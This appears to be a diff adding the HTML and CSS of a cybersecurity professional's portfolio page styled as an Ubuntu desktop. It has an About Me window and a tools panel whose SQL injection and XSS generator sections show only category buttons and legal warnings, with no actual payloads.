@@ -1,0 +1,2527 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SmaRTy Saini - Cybersecurity Professional | SmaRTy OS</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='45' fill='%23E95420'/><text x='50' y='70' font-size='60' text-anchor='middle' fill='white' font-family='Arial'>U</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono:wght@400;700&family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}:root{--ubuntu-orange:#E95420;--ubuntu-purple:#772953;--ubuntu-dark:#5E2750;--ubuntu-aubergine:#2C001E;--panel:#2C2C2C;--terminal:#300A24;--text:#E0E0E0;--text-dim:#8B8B8B;--border:#2D3250;--success:#73C48F;--danger:#F46067;--warning:#F0A13D}body{font-family:Ubuntu,sans-serif;overflow:hidden;height:100vh;background:var(--dark-bg);color:var(--text)}#desktop{background:url('data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABQODxIPDRQSEBIXFRQdHx4eHRoaHSQtJSEkMjU1LC0yMi4xODY6Oi4/RUVFPz5IcldqXY+Ji5iYnLCwuL+/v/H/2wBDARUXFx4aHSYeHiasKDk') center/cover fixed}#desktop::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(94,39,80,0.95),rgba(48,10,36,0.92));backdrop-filter:blur(5px)}#login-screen{position:fixed;inset:0;background:linear-gradient(135deg,#5E2750,#772953,#300A24);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:10000;transition:opacity 0.5s}#login-screen::before{content:'';position:absolute;inset:0;background:url('data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABQODxIPDRQSEBIXFRQdHx4eHRoaHSQtJSEkMjU1LC0yMi4xODY6Oi4/RUVFPz5IcldqXY+Ji5iYnLCwuL+') center/cover;opacity:0.3}#login-screen.hidden{opacity:0;pointer-events:none}.login-time{color:#fff;font-size:5rem;font-weight:300;margin-bottom:1rem;position:relative;z-index:1;text-shadow:0 0 20px rgba(233,84,32,0.5)}.login-date{color:rgba(255,255,255,0.8);font-size:1.5rem;margin:1rem 0 4rem;position:relative;z-index:1}.login-box{background:rgba(44,44,44,0.8);backdrop-filter:blur(20px);border:1px solid rgba(233,84,32,0.3);border-radius:12px;padding:3rem;text-align:center;min-width:420px;position:relative;z-index:1;box-shadow:0 8px 32px rgba(0,0,0,0.4)}.user-avatar{width:120px;height:120px;border-radius:50%;background:linear-gradient(135deg,#E95420,#DD4814);margin:0 auto 1.5rem;display:flex;align-items:center;justify-content:center;font-size:3rem;color:#fff;font-weight:700;border:4px solid rgba(233,84,32,0.5);box-shadow:0 0 30px rgba(233,84,32,0.4)}.user-name{color:#fff;font-size:1.5rem;margin-bottom:0.5rem;font-weight:600}.user-tagline{color:#E95420;font-size:0.9rem;margin-bottom:2rem;font-family:'Ubuntu Mono',monospace}.login-input{width:100%;padding:1rem;border:2px solid rgba(233,84,32,0.3);background:rgba(48,10,36,0.6);border-radius:8px;color:#fff;font-size:1rem;margin-bottom:1.5rem;transition:all 0.3s}.login-input::placeholder{color:rgba(255,255,255,0.4)}.login-input:focus{outline:0;border-color:#E95420;background:rgba(48,10,36,0.8);box-shadow:0 0 20px rgba(233,84,32,0.3)}.login-btn{width:100%;padding:1rem;background:linear-gradient(135deg,#E95420,#DD4814);color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer;transition:all 0.3s;text-transform:uppercase;letter-spacing:1px}.login-btn:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(233,84,32,0.4)}.login-error{color:var(--danger);font-size:0.9rem;margin-top:0.5rem;display:none}.login-error.show{display:block}#desktop{width:100%;height:100vh;display:none;position:relative}#desktop.active{display:block}.top-panel{position:fixed;top:0;left:0;right:0;height:32px;background:linear-gradient(180deg,rgba(44,44,44,0.95),rgba(48,10,36,0.95));backdrop-filter:blur(10px);border-bottom:1px solid rgba(233,84,32,0.2);display:flex;align-items:center;justify-content:space-between;padding:0 12px;z-index:9000;box-shadow:0 2px 10px rgba(0,0,0,0.3)}.panel-left,.panel-right{display:flex;align-items:center;gap:15px}.panel-logo{display:flex;align-items:center;gap:8px;font-weight:600;font-size:13px;color:#E95420}.panel-icon{cursor:pointer;padding:4px 10px;border-radius:4px;transition:all 0.2s;font-size:12px;color:var(--text)}.panel-icon:hover{background:rgba(233,84,32,0.2);color:#E95420}.system-stats{display:flex;gap:12px;font-size:11px;color:var(--text-dim);font-family:'Ubuntu Mono',monospace}.system-stats span{display:flex;align-items:center;gap:4px}.desktop-icons{position:absolute;top:60px;left:20px;display:grid;grid-gap:20px;padding:20px;z-index:10}.desktop-icon{display:flex;flex-direction:column;align-items:center;width:100px;padding:12px;cursor:pointer;border-radius:8px;transition:all 0.2s;background:rgba(26,31,58,0.3);backdrop-filter:blur(10px);border:1px solid transparent}.desktop-icon:hover{background:rgba(233,84,32,0.2);border-color:rgba(233,84,32,0.4);transform:translateY(-2px)}.file-icon{font-size:48px;margin-bottom:10px;filter:drop-shadow(0 2px 4px rgba(0,0,0,0.3))}.desktop-icon-label{color:#fff;font-size:12px;text-align:center;text-shadow:1px 1px 3px rgba(0,0,0,0.8);font-weight:500}.dock{position:fixed;bottom:0;left:50%;transform:translateX(-50%);height:56px;background:rgba(26,31,58,0.9);backdrop-filter:blur(20px);border:1px solid rgba(233,84,32,0.2);border-radius:16px 16px 0 0;display:flex;align-items:center;justify-content:center;gap:8px;padding:0 20px;z-index:8000;box-shadow:0 -4px 20px rgba(0,0,0,0.4);transition:transform 0.3s ease}.dock.hidden{transform:translateX(-50%) translateY(100%)}.dock:hover{transform:translateX(-50%) translateY(0)!important}.dock-icon{width:40px;height:40px;border-radius:10px;background:rgba(233,84,32,0.1);border:2px solid transparent;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all 0.3s;font-size:20px;position:relative}.dock-icon:hover{transform:translateY(-10px) scale(1.1);background:rgba(233,84,32,0.3);border-color:rgba(233,84,32,0.5);box-shadow:0 8px 20px rgba(233,84,32,0.4)}.dock-icon.active::before{content:'';position:absolute;bottom:-6px;width:4px;height:4px;background:#E95420;border-radius:50%;box-shadow:0 0 8px #E95420}.dock-separator{width:1px;height:32px;background:rgba(233,84,32,0.3);margin:0 8px}.window{position:absolute;background:rgba(13,17,23,0.95);backdrop-filter:blur(20px);border:1px solid rgba(233,84,32,0.3);border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,0.6);min-width:500px;min-height:400px;display:none;flex-direction:column;overflow:hidden}.window.active{display:flex;z-index:100;animation:windowPop 0.3s cubic-bezier(0.68,-0.55,0.265,1.55)}@keyframes windowPop{from{transform:scale(0.9);opacity:0}to{transform:scale(1);opacity:1}}.window.maximized{top:32px!important;left:0!important;width:100%!important;height:calc(100vh - 88px)!important;border-radius:0}.window-header{background:linear-gradient(180deg,rgba(26,31,58,0.95),rgba(13,17,23,0.95));padding:10px 16px;display:flex;align-items:center;justify-content:space-between;cursor:move;user-select:none;border-bottom:1px solid rgba(233,84,32,0.2)}.window-title{font-size:13px;font-weight:600;color:#E95420;display:flex;align-items:center;gap:8px}.window-controls{display:flex;gap:8px}.window-btn{width:16px;height:16px;border-radius:50%;border:none;cursor:pointer;transition:all 0.2s;position:relative}.window-btn:hover{transform:scale(1.2);box-shadow:0 0 10px currentColor}.btn-close{background:#FF006E}.btn-minimize{background:#FB5607}.btn-maximize{background:#73C48F}.window-content{flex:1;overflow:auto;padding:24px;background:rgba(10,14,39,0.8);color:var(--text)}.terminal-window .window-content{background:var(--terminal);padding:20px;font-family:'Ubuntu Mono',monospace;color:#E95420;font-size:14px;line-height:1.6}.terminal-disclaimer{background:rgba(233,84,32,0.1);border:1px solid rgba(233,84,32,0.3);border-radius:8px;padding:12px;margin-bottom:16px;font-size:11px;color:var(--text-dim);line-height:1.6}.terminal-line{margin:5px 0;white-space:pre-wrap;word-wrap:break-word}.terminal-prompt{color:#E95420;font-weight:700}.terminal-input-line{display:flex;gap:8px;margin-top:8px}.terminal-input{flex:1;background:transparent;border:none;color:#E95420;font-family:'Ubuntu Mono',monospace;font-size:14px;outline:none}.encoder-container{display:flex;flex-direction:column;gap:20px}.encoder-tabs{display:flex;gap:10px;border-bottom:2px solid rgba(233,84,32,0.2);padding-bottom:10px}.encoder-tab{padding:10px 20px;background:transparent;border:none;color:var(--text-dim);cursor:pointer;border-radius:8px 8px 0 0;font-weight:600;transition:all 0.2s}.encoder-tab.active{background:rgba(233,84,32,0.2);color:#E95420;border-bottom:2px solid #E95420}.encoder-section{display:none;flex-direction:column;gap:16px}.encoder-section.active{display:flex}.encoder-textarea{width:100%;min-height:120px;padding:16px;background:rgba(13,17,23,0.8);border:1px solid rgba(233,84,32,0.3);border-radius:8px;color:var(--text);font-family:'Ubuntu Mono',monospace;font-size:13px;resize:vertical}.encoder-textarea:focus{outline:none;border-color:var(--ubuntu-orange);box-shadow:0 0 10px rgba(233,84,32,0.3)}.encoder-buttons{display:flex;gap:10px;flex-wrap:wrap}.encoder-btn{padding:10px 20px;background:linear-gradient(135deg,#E95420,#772953);color:#fff;border:none;border-radius:8px;cursor:pointer;font-weight:600;transition:all 0.2s}.encoder-btn:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(233,84,32,0.4)}.encoder-btn.secondary{background:rgba(233,84,32,0.2);color:#E95420}.about-hero{background:linear-gradient(135deg,rgba(233,84,32,0.2),rgba(58,134,255,0.2));border:1px solid rgba(233,84,32,0.3);border-radius:12px;padding:32px;margin-bottom:32px;text-align:center}.about-hero h2{font-size:32px;color:#E95420;margin-bottom:12px}.about-hero .tagline{font-size:18px;color:var(--ubuntu-orange);font-family:'Ubuntu Mono',monospace;margin-bottom:24px}.about-hero .bio{font-size:15px;line-height:1.8;color:var(--text);max-width:800px;margin:0 auto}.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:32px}.stat-card{background:rgba(26,31,58,0.6);border:1px solid rgba(233,84,32,0.3);border-radius:12px;padding:24px;text-align:center;transition:all 0.3s}.stat-card:hover{transform:translateY(-4px);border-color:#E95420;box-shadow:0 8px 20px rgba(233,84,32,0.3)}.stat-number{font-size:36px;font-weight:700;color:#E95420;margin-bottom:8px}.stat-label{font-size:13px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1px}.section-title{font-size:24px;color:var(--ubuntu-orange);margin-bottom:20px;display:flex;align-items:center;gap:12px}.section-title::before{content:'';width:4px;height:24px;background:linear-gradient(180deg,#E95420,#772953);border-radius:2px}.tools-grid,.labs-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:16px;margin-bottom:32px}.tool-card,.lab-card{background:rgba(26,31,58,0.4);border:1px solid rgba(233,84,32,0.2);border-radius:8px;padding:16px;transition:all 0.2s}.tool-card:hover,.lab-card:hover{border-color:#E95420;transform:translateX(4px)}.tool-card h4,.lab-card h4{color:#E95420;margin-bottom:8px;font-size:14px}.tool-card p,.lab-card p{font-size:12px;color:var(--text-dim);line-height:1.6}.lab-meta{display:flex;gap:12px;margin-top:8px;font-size:11px}.lab-badge{background:rgba(233,84,32,0.2);color:var(--ubuntu-orange);padding:4px 8px;border-radius:4px}.cert-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}.cert-card{background:rgba(26,31,58,0.4);border:1px solid rgba(233,84,32,0.2);border-radius:8px;padding:20px;text-align:center}.cert-icon{font-size:40px;margin-bottom:12px}.cert-name{font-size:14px;font-weight:600;color:#E95420;margin-bottom:4px}.cert-issuer{font-size:11px;color:var(--text-dim)}.context-menu{position:fixed;background:rgba(26,31,58,0.95);backdrop-filter:blur(20px);border:1px solid rgba(233,84,32,0.4);border-radius:8px;box-shadow:0 8px 32px rgba(0,0,0,0.6);padding:8px;min-width:200px;z-index:10001;display:none}.context-menu-item{padding:10px 16px;cursor:pointer;border-radius:6px;color:var(--text);transition:all 0.2s;display:flex;align-items:center;gap:12px;font-size:13px}.context-menu-item:hover{background:rgba(233,84,32,0.3);color:#E95420}.context-menu-item .icon{width:20px;text-align:center}.context-menu-divider{height:1px;background:rgba(233,84,32,0.2);margin:6px 0}.notification{position:fixed;top:48px;right:16px;background:rgba(26,31,58,0.95);backdrop-filter:blur(20px);border:1px solid rgba(233,84,32,0.4);border-radius:8px;padding:16px 20px;box-shadow:0 8px 24px rgba(0,0,0,0.4);z-index:9999;display:none;min-width:280px;animation:slideIn 0.3s ease}@keyframes slideIn{from{transform:translateX(400px);opacity:0}to{transform:translateX(0);opacity:1}}.notification.show{display:block}.notification-title{font-weight:600;color:#E95420;margin-bottom:4px}.notification-message{font-size:13px;color:var(--text-dim)}.project-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:20px}.project-card{background:rgba(26,31,58,0.6);border:1px solid rgba(233,84,32,0.2);border-radius:12px;padding:24px;transition:all 0.3s;cursor:pointer}.project-card:hover{transform:translateY(-4px);border-color:#E95420;box-shadow:0 12px 32px rgba(233,84,32,0.3)}.project-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:16px}.project-title{font-size:18px;font-weight:600;color:#E95420}.project-tag{background:rgba(233,84,32,0.3);color:var(--ubuntu-orange);padding:4px 12px;border-radius:12px;font-size:11px;font-weight:600}.project-desc{font-size:14px;line-height:1.7;color:var(--text-dim);margin-bottom:16px}.project-tech{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px}.tech-badge{background:rgba(6,255,165,0.1);color:#E95420;padding:4px 10px;border-radius:6px;font-size:11px;font-family:'Ubuntu Mono',monospace}.project-link{color:var(--ubuntu-orange);text-decoration:none;font-size:13px;font-weight:600;display:inline-flex;align-items:center;gap:6px;transition:gap 0.2s}.project-link:hover{gap:10px}.browser-toolbar{background:rgba(26,31,58,0.8);padding:12px;border-bottom:1px solid rgba(233,84,32,0.2);display:flex;gap:8px;align-items:center}.browser-btn{padding:8px 12px;background:rgba(233,84,32,0.2);border:none;border-radius:6px;color:#E95420;cursor:pointer;font-size:12px;transition:all 0.2s}.browser-btn:hover{background:rgba(233,84,32,0.4)}.browser-url{flex:1;padding:8px 16px;background:rgba(13,17,23,0.8);border:1px solid rgba(233,84,32,0.3);border-radius:8px;color:var(--text);font-family:'Ubuntu Mono',monospace;font-size:12px}.browser-frame{width:100%;height:100%;border:none;background:#fff}.browser-loading,.browser-error{display:none;align-items:center;justify-content:center;flex-direction:column;height:100%;gap:16px}.browser-loading.show,.browser-error.show{display:flex}.spinner{width:40px;height:40px;border:4px solid rgba(233,84,32,0.2);border-top-color:var(--ubuntu-orange);border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}::-webkit-scrollbar{width:8px;height:8px}::-webkit-scrollbar-track{background:rgba(13,17,23,0.4)}::-webkit-scrollbar-thumb{background:rgba(233,84,32,0.4);border-radius:4px}::-webkit-scrollbar-thumb:hover{background:rgba(233,84,32,0.6)}@media(max-width:768px){.dock{width:90%;padding:0 10px}.dock-icon{width:36px;height:36px;font-size:18px}.window{min-width:90vw}.login-box{min-width:90vw;padding:2rem}.stats-grid{grid-template-columns:1fr}.tools-grid,.labs-grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div id="login-screen">
+<div class="login-time" id="loginTime">00:00</div>
+<div class="login-date" id="loginDate">Monday, January 1</div>
+<div class="login-box">
+<div class="user-avatar">SS</div>
+<h1 class="user-name">SmaRTy Saini</h1>
+<p class="user-tagline">Cybersecurity Professional | Healthcare Integration Specialist</p>
+<input type="password" class="login-input" id="passwordInput" placeholder="Enter password to unlock">
+<button class="login-btn" id="loginBtn">Sign In</button>
+<div class="login-error" id="loginError">Camon. Try again.</div>
+<div style="margin-top:20px;padding:16px;background:rgba(233,84,32,0.1);border:1px solid rgba(233,84,32,0.3);border-radius:8px;text-align:left">
+<div style="font-size:13px;color:#E95420;font-weight:600;margin-bottom:8px">🔐 Password Hint</div>
+<div style="font-size:12px;color:rgba(255,255,255,0.8);line-height:1.6">
+
+<span style="font-size:11px;color:rgba(255,255,255,0.6);margin-top:4px;display:block">If you know linux - then you should know the password.</span>
+</div>
+</div>
+</div>
+</div>
+
+<div id="desktop">
+<div class="top-panel">
+<div class="panel-left">
+<div class="panel-logo">
+<span style="font-size:18px">🐧</span>
+<span style="background:linear-gradient(90deg,#E95420,#772953);-webkit-background-clip:text;-webkit-text-fill-color:transparent">Ubuntu SmaRTy OS</span>
+</div>
+<div class="system-stats">
+<span>📂 <span id="currentFolder">Desktop</span></span>
+<span>🪟 <span id="windowCount">0</span> windows</span>
+</div>
+</div>
+<div class="panel-right">
+<div class="system-stats">
+<span>💾 <span id="ramUsage">0</span>MB</span>
+<span>💻 <span id="cpuUsage">0</span>%</span>
+<span>📶 <span id="networkSpeed">0</span>KB/s</span>
+<span style="color:#73C48F">● Online</span>
+<span>⏰ <span id="currentTime">00:00</span></span>
+<span>📅 <span id="currentDate">Jan 1</span></span>
+</div>
+<button class="panel-icon" id="logoutBtn" title="Logout" style="margin-left:10px;background:rgba(255,0,110,0.2);color:#FF006E;border:1px solid rgba(255,0,110,0.3);padding:4px 12px;border-radius:6px;font-weight:600">
+🚪 Logout
+</button>
+</div>
+</div>
+
+<div class="desktop-icons">
+<div class="desktop-icon" data-app="about" tabindex="0" role="button">
+<div class="file-icon">👤</div>
+<div class="desktop-icon-label">About Me</div>
+</div>
+<div class="desktop-icon" data-app="tools" tabindex="0" role="button">
+<div class="file-icon">🛠️</div>
+<div class="desktop-icon-label">Security Tools</div>
+</div>
+<div class="desktop-icon" data-app="contact" tabindex="0" role="button">
+<div class="file-icon">📧</div>
+<div class="desktop-icon-label">Contact</div>
+</div>
+<div class="desktop-icon" data-app="resume" tabindex="0" role="button">
+<div class="file-icon">📄</div>
+<div class="desktop-icon-label">Resume</div>
+</div>
+<div class="desktop-icon" data-app="games" tabindex="0" role="button">
+<div class="file-icon">🎮</div>
+<div class="desktop-icon-label">Games</div>
+</div>
+</div>
+
+<nav class="dock">
+<div class="dock-icon" data-app="about" title="About Me">👤</div>
+<div class="dock-icon" data-app="tools" title="Security Tools">🛠️</div>
+<div class="dock-icon" data-app="contact" title="Contact">📧</div>
+<div class="dock-icon" data-app="resume" title="Resume">📄</div>
+<div class="dock-icon" data-app="terminal" title="Terminal">💻</div>
+<div class="dock-icon" data-app="projects" title="Projects">📁</div>
+<div class="dock-icon" data-app="encoder" title="Encode/Decode">🔐</div>
+<div class="dock-separator"></div>
+<div class="dock-icon" data-app="games" title="Games">🎮</div>
+<div class="dock-icon" data-app="browser" title="Browser">🌐</div>
+<div class="dock-icon" data-app="files" title="Files">📂</div>
+<div class="dock-icon" data-app="settings" title="Settings">⚙️</div>
+</nav>
+
+<!-- Security Tools Window -->
+<div class="window" id="w-tools" style="top:70px;left:110px;width:950px;height:650px">
+<div class="window-header">
+<div class="window-title">🛠️ Security Tools Suite</div>
+<div class="window-controls">
+<button class="window-btn btn-minimize" data-close="w-tools"></button>
+<button class="window-btn btn-maximize" data-max="w-tools"></button>
+<button class="window-btn btn-close" data-close="w-tools"></button>
+</div>
+</div>
+<div class="window-content">
+<div class="about-hero" style="margin-bottom:24px">
+<h2>🔐 Professional Security Tools</h2>
+<div class="tagline">Real working tools for penetration testing and security analysis</div>
+</div>
+
+<div class="encoder-tabs">
+<button class="encoder-tab active" data-tab="hash">Hash Generator</button>
+<button class="encoder-tab" data-tab="port">Port Scanner</button>
+<button class="encoder-tab" data-tab="password">Password Checker</button>
+<button class="encoder-tab" data-tab="jwt">JWT Decoder</button>
+<button class="encoder-tab" data-tab="sql">SQL Injection Tester</button>
+<button class="encoder-tab" data-tab="xss">XSS Payload Generator</button>
+<button class="encoder-tab" data-tab="network">Network Calculator</button>
+</div>
+
+<!-- Hash Generator Tool -->
+<div class="encoder-section active" id="tool-hash">
+<h3 style="color:#E95420;margin-bottom:12px">🔐 Hash Generator & Analyzer</h3>
+<p style="font-size:13px;color:var(--text-dim);margin-bottom:16px">Generate various cryptographic hashes from input text. Supports MD5, SHA-1, SHA-256, SHA-512.</p>
+<textarea class="encoder-textarea" id="hashInput" placeholder="Enter text to hash..."></textarea>
+<div class="encoder-buttons">
+<button class="encoder-btn" data-tool="hash" data-type="md5">MD5</button>
+<button class="encoder-btn" data-tool="hash" data-type="sha1">SHA-1</button>
+<button class="encoder-btn" data-tool="hash" data-type="sha256">SHA-256</button>
+<button class="encoder-btn" data-tool="hash" data-type="sha512">SHA-512</button>
+<button class="encoder-btn secondary" data-action="clear-dual" data-target1="hashInput" data-target2="hashOutput">Clear</button>
+</div>
+<textarea class="encoder-textarea" id="hashOutput" placeholder="Hash output will appear here..." readonly></textarea>
+<div style="margin-top:12px;padding:12px;background:rgba(233,84,32,0.1);border:1px solid rgba(233,84,32,0.3);border-radius:8px;font-size:12px;color:var(--text-dim)">
+💡 <strong>Note:</strong> These hashes are generated client-side using Web Crypto API. Always use bcrypt/scrypt/argon2 for password hashing in production.
+</div>
+</div>
+
+<!-- Port Scanner Simulator -->
+<div class="encoder-section" id="tool-port">
+<h3 style="color:#E95420;margin-bottom:12px">🔍 Port Scanner Simulator</h3>
+<p style="font-size:13px;color:var(--text-dim);margin-bottom:16px">Simulate common port scanning scenarios. Educational tool showing typical open/closed ports.</p>
+<input type="text" class="encoder-textarea" id="portScanHost" placeholder="Enter target (e.g., 192.168.1.1)" style="min-height:40px">
+<div class="encoder-buttons" style="margin:16px 0">
+<button class="encoder-btn" data-tool="port" data-type="common">Scan Common Ports</button>
+<button class="encoder-btn" data-tool="port" data-type="full">Full Scan (1-1024)</button>
+<button class="encoder-btn secondary" data-action="clear" data-target="portScanOutput">Clear Results</button>
+</div>
+<textarea class="encoder-textarea" id="portScanOutput" placeholder="Scan results will appear here..." readonly style="min-height:200px"></textarea>
+<div style="margin-top:12px;padding:12px;background:rgba(233,84,32,0.1);border:1px solid rgba(233,84,32,0.3);border-radius:8px;font-size:12px;color:var(--text-dim)">
+⚠️ <strong>Educational Only:</strong> This is a simulator for demonstration. Real port scanning requires authorization and proper tools like Nmap.
+</div>
+</div>
+
+<!-- Password Strength Checker -->
+<div class="encoder-section" id="tool-password">
+<h3 style="color:#E95420;margin-bottom:12px">🔒 Password Strength Analyzer</h3>
+<p style="font-size:13px;color:var(--text-dim);margin-bottom:16px">Analyze password strength and get recommendations for improvement.</p>
+<input type="password" class="encoder-textarea" id="passwordCheck" placeholder="Enter password to analyze..." style="min-height:40px">
+<button class="encoder-btn" data-tool="password" data-type="toggle" style="margin-bottom:16px">👁️ Show/Hide</button>
+<button class="encoder-btn" data-tool="password" data-type="analyze">Analyze Strength</button>
+<button class="encoder-btn" data-tool="password" data-type="generate">Generate Strong Password</button>
+<div id="passwordStrengthOutput" style="margin-top:16px"></div>
+<div style="margin-top:16px;padding:12px;background:rgba(233,84,32,0.1);border:1px solid rgba(233,84,32,0.3);border-radius:8px;font-size:12px;color:var(--text-dim)">
+🛡️ <strong>Best Practices:</strong> Use 12+ characters, mix uppercase/lowercase, numbers, symbols. Consider using a password manager.
+</div>
+</div>
+
+<!-- JWT Decoder -->
+<div class="encoder-section" id="tool-jwt">
+<h3 style="color:#E95420;margin-bottom:12px">🎫 JWT Token Decoder</h3>
+<p style="font-size:13px;color:var(--text-dim);margin-bottom:16px">Decode and analyze JSON Web Tokens (JWT). View header, payload, and signature.</p>
+<textarea class="encoder-textarea" id="jwtInput" placeholder="Paste JWT token here (eyJhbGciOiJIUzI1NiIs...)"></textarea>
+<button class="encoder-btn" data-tool="jwt" data-type="decode">Decode JWT</button>
+<button class="encoder-btn secondary" data-action="clear-dual" data-target1="jwtInput" data-target2="jwtOutput" data-html="true">Clear</button>
+<div id="jwtOutput" style="margin-top:16px"></div>
+<div style="margin-top:12px;padding:12px;background:rgba(233,84,32,0.1);border:1px solid rgba(233,84,32,0.3);border-radius:8px;font-size:12px;color:var(--text-dim)">
+🔍 <strong>JWT Security:</strong> Never trust client-side decoded JWTs. Always verify signatures server-side. Check for algorithm confusion attacks.
+</div>
+</div>
+
+<!-- SQL Injection Tester -->
+<div class="encoder-section" id="tool-sql">
+<h3 style="color:#E95420;margin-bottom:12px">💉 SQL Injection Pattern Generator</h3>
+<p style="font-size:13px;color:var(--text-dim);margin-bottom:16px">Generate common SQL injection test payloads for security testing.</p>
+<div class="encoder-buttons">
+<button class="encoder-btn" data-tool="sql" data-type="basic">Basic Payloads</button>
+<button class="encoder-btn" data-tool="sql" data-type="union">UNION-based</button>
+<button class="encoder-btn" data-tool="sql" data-type="blind">Blind SQLi</button>
+<button class="encoder-btn" data-tool="sql" data-type="timebased">Time-based</button>
+<button class="encoder-btn secondary" data-action="clear" data-target="sqlOutput">Clear</button>
+</div>
+<textarea class="encoder-textarea" id="sqlOutput" placeholder="SQL injection payloads will appear here..." readonly style="min-height:250px;margin-top:16px"></textarea>
+<div style="margin-top:12px;padding:12px;background:rgba(255,0,110,0.1);border:1px solid rgba(255,0,110,0.3);border-radius:8px;font-size:12px;color:#FF006E">
+⚠️ <strong>Legal Warning:</strong> Only test on systems you own or have explicit permission to test. Unauthorized testing is illegal.
+</div>
+</div>
+
+<!-- XSS Payload Generator -->
+<div class="encoder-section" id="tool-xss">
+<h3 style="color:#E95420;margin-bottom:12px">🚨 XSS Payload Generator</h3>
+<p style="font-size:13px;color:var(--text-dim);margin-bottom:16px">Generate Cross-Site Scripting (XSS) test payloads for security assessments.</p>
+<div class="encoder-buttons">
+<button class="encoder-btn" data-tool="xss" data-type="basic">Basic XSS</button>
+<button class="encoder-btn" data-tool="xss" data-type="eventhandler">Event Handlers</button>
+<button class="encoder-btn" data-tool="xss" data-type="img">IMG Tags</button>
+<button class="encoder-btn" data-tool="xss" data-type="bypass">Filter Bypasses</button>
+<button class="encoder-btn secondary" onclick="document.getElementById(&quot;xssOutput&quot;).value=&quot;&quot;">Clear</button>
+</div>
+<textarea class="encoder-textarea" id="xssOutput" placeholder="XSS payloads will appear here..." readonly style="min-height:250px;margin-top:16px"></textarea>
+<div style="margin-top:12px;padding:12px;background:rgba(255,0,110,0.1);border:1px solid rgba(255,0,110,0.3);border-radius:8px;font-size:12px;color:#FF006E">
+⚠️ <strong>Responsible Disclosure:</strong> Use only for authorized testing. Report vulnerabilities responsibly through proper channels.
+</div>
+</div>
+
+<!-- Network Calculator -->
+<div class="encoder-section" id="tool-network">
+<h3 style="color:#E95420;margin-bottom:12px">🌐 Network/Subnet Calculator</h3>
+<p style="font-size:13px;color:var(--text-dim);margin-bottom:16px">Calculate subnet masks, network ranges, broadcast addresses, and available hosts.</p>
+<input type="text" class="encoder-textarea" id="networkInput" placeholder="Enter IP/CIDR (e.g., 192.168.1.0/24)" style="min-height:40px">
+<button class="encoder-btn" data-tool="network" data-type="calculate">Calculate</button>
+<button class="encoder-btn secondary" data-action="clear-dual" data-target1="networkInput" data-target2="networkOutput" data-html="true">Clear</button>
+<div id="networkOutput" style="margin-top:16px"></div>
+<div style="margin-top:12px;padding:12px;background:rgba(233,84,32,0.1);border:1px solid rgba(233,84,32,0.3);border-radius:8px;font-size:12px;color:var(--text-dim)">
+📚 <strong>Subnetting:</strong> Essential skill for network security. Understanding IP addressing is crucial for firewall rules and network segmentation.
+</div>
+</div>
+
+</div>
+</div>
+
+<!-- About Me Window -->
+<div class="window" id="w-about" style="top:80px;left:100px;width:900px;height:600px">
+<div class="window-header">
+<div class="window-title">🛡️ About Me - Cybersecurity Professional</div>
+<div class="window-controls">
+<button class="window-btn btn-minimize" data-close="w-about"></button>
+<button class="window-btn btn-maximize" data-max="w-about"></button>
+<button class="window-btn btn-close" data-close="w-about"></button>
+</div>
+</div>
+<div class="window-content">
+<div class="about-hero">
+<h2>Balwinder Singh</h2>
+<div class="tagline">Penetration Tester | Healthcare Integration Specialist | CTF Player</div>
+<div class="bio">
+Passionate cybersecurity professional with 15+ years of experience in penetration testing, red team operations, and security research. Active CTF player and bug bounty hunter, specializing in web application security, network exploitation, and privilege escalation. Additionally, extensive expertise in healthcare interoperability with <strong style="color:#E95420">1,000+ HL7 integration instances</strong> deployed across <strong style="color:#E95420">40+ EMR/EHR systems</strong> including Athena, Cerner, Epic (OCHIN), NextGen, Medisoft, LabSoft, Ellkay, and more.
+</div>
+</div>
+
+<div class="stats-grid">
+<div class="stat-card">
+<div class="stat-number">15+</div>
+<div class="stat-label">Years Experience</div>
+</div>
+<div class="stat-card">
+<div class="stat-number">100+</div>
+<div class="stat-label">CTF Challenges</div>
+</div>
+<div class="stat-card">
+<div class="stat-number">50+</div>
+<div class="stat-label">Machines Owned</div>
+</div>
+<div class="stat-card">
+<div class="stat-number">10+</div>
+<div class="stat-label">Bug Bounties</div>
+</div>
+</div>
+
+<h3 class="section-title">🏥 Healthcare Integration & HL7 Expertise</h3>
+<div class="about-hero" style="margin-bottom:32px">
+<div class="bio">
+<strong style="color:#E95420">Healthcare Interoperability Specialist</strong> with extensive experience in HL7 integration and EMR/EHR system connectivity. Built and deployed <strong>1,000+ integration instances</strong> across diverse healthcare environments, ensuring seamless data exchange and HIPAA-compliant communication between systems.
+</div>
+</div>
+
+<div class="stats-grid" style="margin-bottom:32px">
+<div class="stat-card">
+<div class="stat-number">1,000+</div>
+<div class="stat-label">HL7 Instances Built</div>
+</div>
+<div class="stat-card">
+<div class="stat-number">40+</div>
+<div class="stat-label">EMR/EHR Systems</div>
+</div>
+<div class="stat-card">
+<div class="stat-number">100%</div>
